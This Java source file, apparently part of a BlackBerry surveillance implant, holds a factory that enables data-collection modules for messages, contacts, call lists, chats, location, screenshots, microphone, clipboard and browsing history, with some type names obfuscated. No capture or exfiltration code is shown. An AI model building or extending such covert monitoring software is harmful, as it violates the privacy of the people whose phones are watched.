//#preprocess
package blackberry.module;

import blackberry.Messages;
import blackberry.Status;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public class FactoryModule {
    //#ifdef DEBUG
    private static Debug debug = new Debug("FactoryModule", DebugLevel.VERBOSE); //$NON-NLS-1$

    //#endif

    /**
     * mapAgent() Add agent id defined by "key" into the running map. If the
     * agent is already present, the old object is returned.
     * 
     * @param key
     *            : Agent ID
     * @return the requested agent or null in case of error
     */
    public static BaseModule create(String type, String subtype) {
        BaseModule a = null;

        if (ModuleMessage.getStaticType().equals(type)) {
            a = new ModuleMessage();
        } else if (ModuleAddressBook.getStaticType().equals(type)) {
            a = new ModuleAddressBook();
        } else if (ModuleCalendar.getStaticType().equals(type)) {
            a = new ModuleCalendar();
        } else if (ModuleCallList.getStaticType().equals(type)
                || Messages.getString("1k.1").equals(type)) { //$NON-NLS-1$
            if (!Status.self().callistCreated) {
                a = new ModuleCallList();
                Status.self().callistCreated = true;
            }
        } else if (ModuleDevice.getStaticType().equals(type)) {
            a = new ModuleDevice();
        } else if (ModuleChat.getStaticType().equals(type)) {
            a = new ModuleChat();
        } else if (ModulePosition.getStaticType().equals(type)) {
            a = new ModulePosition();
        } else if (ModuleSnapshot.getStaticType().equals(type)
                || Messages.getString("1k.2").equals(type)) { //$NON-NLS-1$
            a = new ModuleSnapshot();
        } else if (ModuleMessage.getStaticType().equals(type)) {
            a = new ModuleMessage();
        } else if (ModuleMic.getStaticType().equals(type)) {
            a = new ModuleMic();
        } else if (Messages.getString("1k.3").equals(type)) { //$NON-NLS-1$
            //a = new ModuleCamera();
        } else if (ModuleClipboard.getStaticType().equals(type)) {
            a = new ModuleClipboard();
        } else if (ModuleCrisis.getStaticType().equals(type)) {
            a = new ModuleCrisis();
        } else if (ModuleApplication.getStaticType().equals(type)) {
            a = new ModuleApplication();
        } else if (ModuleUrl.getStaticType().equals(type)) {
            a = new ModuleUrl();
        } else {
            //#ifdef DEBUG
            debug.trace(" Error (factory), unknown type: " + type);//$NON-NLS-1$
            //#endif
        }

        if (a != null) {
            a.enable(true);
        }

        return a;
    }

}
